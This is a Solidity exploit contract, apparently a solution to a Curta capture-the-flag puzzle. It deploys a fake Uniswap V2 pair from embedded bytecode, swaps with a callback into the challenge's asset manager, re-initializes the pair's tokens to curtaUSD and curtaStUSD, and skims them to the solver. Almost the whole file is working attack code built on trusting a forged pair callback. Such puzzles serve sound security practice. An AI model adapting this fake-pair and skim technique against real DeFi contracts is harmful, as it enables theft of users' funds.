pragma solidity 0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "forge-std/Test.sol";

interface IPuzzle {
  function factories(uint256) external view returns (address);
  function verify(uint256 seed, uint256) external view returns (bool);
}

interface IChallenge {
  function assetManager() external view returns (address);
  function curtaUSD() external view returns (address);
  function curtaStUSD() external view returns (address);
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}


contract Token is ERC20 {
    constructor(uint256 initialSupply, string memory name) ERC20(name, name) {
      _mint(msg.sender, initialSupply);
    }
}

contract Deployer {
  address[5] addrs;
  address factory;
  uint256[6] tmp;
  uint256 lock = 1;

  constructor(bytes memory data) {
    factory = msg.sender;
    assembly {
      return (add(data, 0x20), mload(data))
    }
  }
}

contract Exp {
  bytes constant pairCode = hex"608060405234801561001057600080fd5b50600436106101a95760003560e01c80636a627842116100f9578063ba9a7a5611610097578063d21220a711610071578063d21220a714610408578063d505accf1461041b578063dd62ed3e1461042e578063fff6cae91461045957600080fd5b8063ba9a7a56146103d9578063bc25cf77146103e2578063c45a0155146103f557600080fd5b80637ecebe00116100d35780637ecebe001461035957806389afcb441461037957806395d89b41146103a1578063a9059cbb146103c657600080fd5b80636a6278421461031d57806370a08231146103305780637464fc3d1461035057600080fd5b806323b872dd116101665780633644e515116101405780633644e515146102ef578063485cc955146102f85780635909c0d51461030b5780635a3d54931461031457600080fd5b806323b872dd1461029b57806330adf81f146102ae578063313ce567146102d557600080fd5b8063022c0d9f146101ae57806306fdde03146101c35780630902f1ac14610202578063095ea7b3146102365780630dfe16811461025957806318160ddd14610284575b600080fd5b6101c16101bc366004611cc6565b610461565b005b6101ec6040518060400160405280600a8152602001692ab734b9bbb0b8102b1960b11b81525081565b6040516101f99190611d80565b60405180910390f35b61020a61097b565b604080516001600160701b03948516815293909216602084015263ffffffff16908201526060016101f9565b610249610244366004611db3565b6109a5565b60405190151581526020016101f9565b60065461026c906001600160a01b031681565b6040516001600160a01b0390911681526020016101f9565b61028d60005481565b6040519081526020016101f9565b6102496102a9366004611ddf565b6109bc565b61028d7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b6102dd601281565b60405160ff90911681526020016101f9565b61028d60035481565b6101c1610306366004611e20565b610a51565b61028d60095481565b61028d600a5481565b61028d61032b366004611e59565b610ad0565b61028d61033e366004611e59565b60016020526000908152604090205481565b61028d600b5481565b61028d610367366004611e59565b60046020526000908152604090205481565b61038c610387366004611e59565b610d9e565b604080519283526020830191909152016101f9565b6101ec604051806040016040528060068152602001652aa72496ab1960d11b81525081565b6102496103d4366004611db3565b611103565b61028d6103e881565b6101c16103f0366004611e59565b611110565b60055461026c906001600160a01b031681565b60075461026c906001600160a01b031681565b6101c1610429366004611e76565b611223565b61028d61043c366004611e20565b600260209081526000928352604080842090915290825290205481565b6101c1611437565b600c5460011461048c5760405162461bcd60e51b815260040161048390611eed565b60405180910390fd5b6000600c558415158061049f5750600084115b6104f95760405162461bcd60e51b815260206004820152602560248201527f556e697377617056323a20494e53554646494349454e545f4f55545055545f416044820152641353d5539560da1b6064820152608401610483565b60008061050461097b565b5091509150816001600160701b0316871080156105295750806001600160701b031686105b61057f5760405162461bcd60e51b815260206004820152602160248201527f556e697377617056323a20494e53554646494349454e545f4c495155494449546044820152605960f81b6064820152608401610483565b60065460075460009182916001600160a01b039182169190811690891682148015906105bd5750806001600160a01b0316896001600160a01b031614155b6106015760405162461bcd60e51b8152602060048201526015602482015274556e697377617056323a20494e56414c49445f544f60581b6044820152606401610483565b8a1561061257610612828a8d61155b565b891561062357610623818a8c61155b565b8615610690576040516304347a1760e21b81526001600160a01b038a16906310d1e85c9061065d9033908f908f908e908e90600401611f18565b600060405180830381600087803b15801561067757600080fd5b505af115801561068b573d6000803e3d6000fd5b505050505b6040516370a0823160e01b81523060048201526001600160a01b038316906370a0823190602401602060405180830381865afa1580156106d4573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106f89190611f64565b6040516370a0823160e01b81523060048201529094506001600160a01b038216906370a0823190602401602060405180830381865afa15801561073f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107639190611f64565b92505050600089856001600160701b031661077e9190611f93565b831161078b5760006107a8565b61079e8a6001600160701b038716611f93565b6107a89084611f93565b905060006107bf8a6001600160701b038716611f93565b83116107cc5760006107e9565b6107df8a6001600160701b038716611f93565b6107e99084611f93565b905060008211806107fa5750600081115b6108525760405162461bcd60e51b8152602060048201526024808201527f556e697377617056323a20494e53554646494349454e545f494e5055545f414d60448201526313d5539560e21b6064820152608401610483565b600061085f836003611fa6565b61086b866103e8611fa6565b6108759190611f93565b90506000610884836003611fa6565b610890866103e8611fa6565b61089a9190611f93565b90506108b26001600160701b03808916908a16611fa6565b6108bf90620f4240611fa6565b6108c98284611fa6565b10156109065760405162461bcd60e51b815260206004820152600c60248201526b556e697377617056323a204b60a01b6044820152606401610483565b5050610914848488886116a6565b60408051838152602081018390529081018c9052606081018b90526001600160a01b038a169033907fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d8229060800160405180910390a350506001600c55505050505050505050565b6008546001600160701b0380821692600160701b830490911691600160e01b900463ffffffff1690565b60006109b2338484611892565b5060015b92915050565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610a3c576001600160a01b0384166000908152600260209081526040808320338452909152902054610a17908390611f93565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b610a478484846118f4565b5060019392505050565b6005546001600160a01b03163314610aa25760405162461bcd60e51b81526020600482015260146024820152732ab734b9bbb0b82b191d102327a92124a22222a760611b6044820152606401610483565b600680546001600160a01b039384166001600160a01b03199182161790915560078054929093169116179055565b6000600c54600114610af45760405162461bcd60e51b815260040161048390611eed565b6000600c81905580610b0461097b565b506006546040516370a0823160e01b81523060048201529294509092506000916001600160a01b03909116906370a0823190602401602060405180830381865afa158015610b56573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b7a9190611f64565b6007546040516370a0823160e01b81523060048201529192506000916001600160a01b03909116906370a0823190602401602060405180830381865afa158015610bc8573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610bec9190611f64565b90506000610c036001600160701b03861684611f93565b90506000610c1a6001600160701b03861684611f93565b90506000610c28878761199c565b60008054919250819003610c69576103e8610c4b610c468587611fa6565b611adb565b610c559190611f93565b9850610c6460006103e8611b4b565b610cb0565b610cad6001600160701b038916610c808387611fa6565b610c8a9190611fd3565b6001600160701b038916610c9e8487611fa6565b610ca89190611fd3565b611bdc565b98505b60008911610d115760405162461bcd60e51b815260206004820152602860248201527f556e697377617056323a20494e53554646494349454e545f4c495155494449546044820152671657d3525395115160c21b6064820152608401610483565b610d1b8a8a611b4b565b610d2786868a8a6116a6565b8115610d5057600854610d4c906001600160701b03600160701b820481169116611fa6565b600b555b604080518581526020810185905233917f4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f910160405180910390a250506001600c5550949695505050505050565b600080600c54600114610dc35760405162461bcd60e51b815260040161048390611eed565b6000600c81905580610dd361097b565b506006546007546040516370a0823160e01b81523060048201529395509193506001600160a01b039081169291169060009083906370a0823190602401602060405180830381865afa158015610e2d573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610e519190611f64565b6040516370a0823160e01b81523060048201529091506000906001600160a01b038416906370a0823190602401602060405180830381865afa158015610e9b573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610ebf9190611f64565b30600090815260016020526040812054919250610edc888861199c565b60005490915080610eed8685611fa6565b610ef79190611fd3565b9a5080610f048585611fa6565b610f0e9190611fd3565b995060008b118015610f20575060008a115b610f7d5760405162461bcd60e51b815260206004820152602860248201527f556e697377617056323a20494e53554646494349454e545f4c495155494449546044820152671657d0955493915160c21b6064820152608401610483565b610f873084611bf4565b610f92878d8d61155b565b610f9d868d8c61155b565b6040516370a0823160e01b81523060048201526001600160a01b038816906370a0823190602401602060405180830381865afa158015610fe1573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906110059190611f64565b6040516370a0823160e01b81523060048201529095506001600160a01b038716906370a0823190602401602060405180830381865afa15801561104c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906110709190611f64565b935061107e85858b8b6116a6565b81156110a7576008546110a3906001600160701b03600160701b820481169116611fa6565b600b555b604080518c8152602081018c90526001600160a01b038e169133917fdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496910160405180910390a35050505050505050506001600c81905550915091565b60006109b23384846118f4565b600c546001146111325760405162461bcd60e51b815260040161048390611eed565b6000600c556006546007546008546040516370a0823160e01b81523060048201526001600160a01b0393841693909216916111d191849186916001600160701b03169083906370a08231906024015b602060405180830381865afa15801561119e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906111c29190611f64565b6111cc9190611f93565b61155b565b6008546040516370a0823160e01b81523060048201526112199183918691600160701b90046001600160701b0316906001600160a01b038416906370a0823190602401611181565b50506001600c5550565b428410156112685760405162461bcd60e51b8152602060048201526012602482015271155b9a5cddd85c158c8e881156141254915160721b6044820152606401610483565b6003546001600160a01b038816600090815260046020526040812080549192917f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9918b918b918b9190876112bb83611fe7565b909155506040805160208101969096526001600160a01b0394851690860152929091166060840152608083015260a082015260c0810187905260e0016040516020818303038152906040528051906020012060405160200161133492919061190160f01b81526002810192909252602282015260420190565b60408051601f198184030181528282528051602091820120600080855291840180845281905260ff88169284019290925260608301869052608083018590529092509060019060a0016020604051602081039080840390855afa15801561139f573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906113d55750886001600160a01b0316816001600160a01b0316145b6114215760405162461bcd60e51b815260206004820152601c60248201527f556e697377617056323a20494e56414c49445f5349474e4154555245000000006044820152606401610483565b61142c898989611892565b505050505050505050565b600c546001146114595760405162461bcd60e51b815260040161048390611eed565b6000600c556006546040516370a0823160e01b8152306004820152611554916001600160a01b0316906370a0823190602401602060405180830381865afa1580156114a8573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906114cc9190611f64565b6007546040516370a0823160e01b81523060048201526001600160a01b03909116906370a0823190602401602060405180830381865afa158015611514573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906115389190611f64565b6008546001600160701b0380821691600160701b9004166116a6565b6001600c55565b604080518082018252601981527f7472616e7366657228616464726573732c75696e74323536290000000000000060209182015281516001600160a01b0385811660248301526044808301869052845180840390910181526064909201845291810180516001600160e01b031663a9059cbb60e01b179052915160009283928716916115e79190612000565b6000604051808303816000865af19150503d8060008114611624576040519150601f19603f3d011682016040523d82523d6000602084013e611629565b606091505b5091509150818015611653575080511580611653575080806020019051810190611653919061201c565b61169f5760405162461bcd60e51b815260206004820152601a60248201527f556e697377617056323a205452414e534645525f4641494c45440000000000006044820152606401610483565b5050505050565b6001600160701b0384118015906116c457506001600160701b038311155b6117065760405162461bcd60e51b8152602060048201526013602482015272556e697377617056323a204f564552464c4f5760681b6044820152606401610483565b60006117176401000000004261203e565b60085490915060009061173790600160e01b900463ffffffff1683612052565b905060008163ffffffff1611801561175757506001600160701b03841615155b801561176b57506001600160701b03831615155b156117fa578063ffffffff166117938561178486611c80565b6001600160e01b031690611c99565b6001600160e01b03166117a69190611fa6565b600960008282546117b79190612076565b909155505063ffffffff81166117d08461178487611c80565b6001600160e01b03166117e39190611fa6565b600a60008282546117f49190612076565b90915550505b6008805463ffffffff8416600160e01b026001600160e01b036001600160701b03898116600160701b9081026001600160e01b03199095168c83161794909417918216831794859055604080519382169282169290921783529290930490911660208201527f1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1910160405180910390a1505050505050565b6001600160a01b0383811660008181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92591015b60405180910390a3505050565b6001600160a01b038316600090815260016020526040902054611918908290611f93565b6001600160a01b038085166000908152600160205260408082209390935590841681522054611948908290612076565b6001600160a01b0380841660008181526001602052604090819020939093559151908516907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906118e79085815260200190565b600080600560009054906101000a90046001600160a01b03166001600160a01b031663017e7e586040518163ffffffff1660e01b8152600401602060405180830381865afa1580156119f2573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611a169190612089565b600b546001600160a01b038216158015945091925090611ac7578015611ac2576000611a51610c466001600160701b03808816908916611fa6565b90506000611a5e83611adb565b905080821115611abf576000611a748284611f93565b600054611a819190611fa6565b9050600082611a91856005611fa6565b611a9b9190612076565b90506000611aa98284611fd3565b90508015611abb57611abb8782611b4b565b5050505b50505b611ad3565b8015611ad3576000600b555b505092915050565b60006003821115611b3c5750806000611af5600283611fd3565b611b00906001612076565b90505b81811015611b3657905080600281611b1b8186611fd3565b611b259190612076565b611b2f9190611fd3565b9050611b03565b50919050565b8115611b46575060015b919050565b80600054611b599190612076565b60009081556001600160a01b038316815260016020526040902054611b7f908290612076565b6001600160a01b0383166000818152600160205260408082209390935591519091907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef90611bd09085815260200190565b60405180910390a35050565b6000818310611beb5781611bed565b825b9392505050565b6001600160a01b038216600090815260016020526040902054611c18908290611f93565b6001600160a01b03831660009081526001602052604081209190915554611c40908290611f93565b60009081556040518281526001600160a01b038416907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef90602001611bd0565b60006109b6600160701b6001600160701b0384166120a6565b6000611bed6001600160701b038316846120d8565b6001600160a01b0381168114611cc357600080fd5b50565b600080600080600060808688031215611cde57600080fd5b85359450602086013593506040860135611cf781611cae565b9250606086013567ffffffffffffffff80821115611d1457600080fd5b818801915088601f830112611d2857600080fd5b813581811115611d3757600080fd5b896020828501011115611d4957600080fd5b9699959850939650602001949392505050565b60005b83811015611d77578181015183820152602001611d5f565b50506000910152565b6020815260008251806020840152611d9f816040850160208701611d5c565b601f01601f19169190910160400192915050565b60008060408385031215611dc657600080fd5b8235611dd181611cae565b946020939093013593505050565b600080600060608486031215611df457600080fd5b8335611dff81611cae565b92506020840135611e0f81611cae565b929592945050506040919091013590565b60008060408385031215611e3357600080fd5b8235611e3e81611cae565b91506020830135611e4e81611cae565b809150509250929050565b600060208284031215611e6b57600080fd5b8135611bed81611cae565b600080600080600080600060e0888a031215611e9157600080fd5b8735611e9c81611cae565b96506020880135611eac81611cae565b95506040880135945060608801359350608088013560ff81168114611ed057600080fd5b9699959850939692959460a0840135945060c09093013592915050565b602080825260119082015270155b9a5cddd85c158c8e881313d0d2d151607a1b604082015260600190565b60018060a01b038616815284602082015283604082015260806060820152816080820152818360a0830137600081830160a090810191909152601f909201601f19160101949350505050565b600060208284031215611f7657600080fd5b5051919050565b634e487b7160e01b600052601160045260246000fd5b818103818111156109b6576109b6611f7d565b80820281158282048414176109b6576109b6611f7d565b634e487b7160e01b600052601260045260246000fd5b600082611fe257611fe2611fbd565b500490565b600060018201611ff957611ff9611f7d565b5060010190565b60008251612012818460208701611d5c565b9190910192915050565b60006020828403121561202e57600080fd5b81518015158114611bed57600080fd5b60008261204d5761204d611fbd565b500690565b63ffffffff82811682821603908082111561206f5761206f611f7d565b5092915050565b808201808211156109b6576109b6611f7d565b60006020828403121561209b57600080fd5b8151611bed81611cae565b6001600160e01b038281168282168181028316929181158285048214176120cf576120cf611f7d565b50505092915050565b60006001600160e01b03838116806120f2576120f2611fbd565b9216919091049291505056fea26469706673582212201226b34d26f4461af1d4e07f7aa0c4b0ee8762583d9063468f0096c493bf01d664736f6c63430008170033";

  function generate(address solver) internal pure returns (uint256) {
    return uint256(keccak256(abi.encode(solver)));
  }

  function run(address puzzle) public {
    address challenger = 0x87176364A742aa3cd6a41De1A2E910602881AB7d;
    uint256 seed = generate(challenger);
    address challenge = IPuzzle(puzzle).factories(seed);

    address assetManager = IChallenge(challenge).assetManager(); 
    ERC20 curtaUSD = ERC20(IChallenge(challenge).curtaUSD());
    ERC20 curtaStUSD = ERC20(IChallenge(challenge).curtaStUSD());

    ERC20 tokenA = new Token(1e50, "A");    
    ERC20 tokenB = new Token(1e50, "B");    

    IUniswapV2Pair fakePair = IUniswapV2Pair(address(new Deployer(pairCode)));
    fakePair.initialize(address(tokenA), address(tokenB));

    tokenA.transfer(address(fakePair), 1e30);
    tokenB.transfer(address(fakePair), 1e30);
    fakePair.mint(address(this));

    bytes memory data = abi.encode(address(curtaUSD), address(curtaStUSD), 10000e18, 10000e18);

    tokenA.transfer(address(fakePair), 1e30);
    tokenB.transfer(address(fakePair), 1e30);
    fakePair.swap(1e27, 1e27, assetManager, data);

    ERC20 tokenC = new Token(0, "C");
    fakePair.initialize(address(tokenC), address(tokenC));
    fakePair.sync();
    fakePair.initialize(address(curtaUSD), address(curtaStUSD));
    fakePair.skim(address(uint160(seed)));
    // console.log(curtaUSD.balanceOf(address(challenger)));
    // console.log(curtaStUSD.balanceOf(address(challenger)));

    require(IPuzzle(puzzle).verify(seed, 0), "Not pass");
  }

  function feeTo() external view returns (address) {
    return address(0);
  }
}
